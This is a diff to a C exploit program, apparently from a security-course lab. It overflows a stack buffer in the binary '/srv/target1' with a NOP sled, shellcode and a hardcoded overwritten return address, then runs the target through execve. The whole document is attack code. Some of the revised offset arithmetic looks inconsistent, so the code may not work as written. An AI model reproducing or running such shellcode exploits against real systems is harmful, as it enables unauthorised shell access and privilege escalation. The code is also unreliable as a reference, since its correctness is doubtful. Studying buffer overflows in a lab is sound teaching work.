@@ -7,31 +7,31 @@
 
 #define TARGET "/srv/target1"
 
-const int BUFFER_SIZE = 20;
+const int BUFFER_SIZE = 12;
+const int OFFSET_TO_RET = 8;
 const int SHELLCODE_LENGTH = sizeof(shellcode) - 1;
-const int RETURN_ADDRESS_OFFSET = 16;
-const char* RETURN_ADDRESS = 0xffffd6bc;
+const char* RETURN_ADDRESS = (char*)0xffffd78a;
 
 int main(void)
 {
-  char *args[3];
-  char *env[1];
+char *args[3];
+char *env[1];
 
-  char buf[BUFFER_SIZE];
-  memset(buf, 0x90, BUFFER_SIZE);
-  memcpy(buf, shellcode, SHELLCODE_LENGTH);
+char buf[BUFFER_SIZE + OFFSET_TO_RET + 1];
+memset(buf, '\x90', sizeof(buf));
+buf[BUFFER_SIZE + OFFSET_TO_RET] = 0;
+memcpy(buf + OFFSET_TO_RET, shellcode, SHELLCODE_LENGTH);
+*(unsigned int*)(buf + OFFSET_TO_RET - 4) = (unsigned int)RETURN_ADDRESS;
 
-  *(char**)(buf + RETURN_ADDRESS_OFFSET) = (char*)RETURN_ADDRESS;
+args[0] = TARGET;
+args[1] = buf;
+args[2] = NULL;
 
-  args[0] = TARGET;
-  args[1] = buf;
-  args[2] = NULL;
-  
-  env[0] = NULL;
-  execve(TARGET, args, env);
-  fprintf(stderr, "execve failed.\n");
+env[0] = NULL;
+execve(TARGET, args, env);
+fprintf(stderr, "execve failed.\n");
 
-  return 0;
+return 0;
 }
 
 
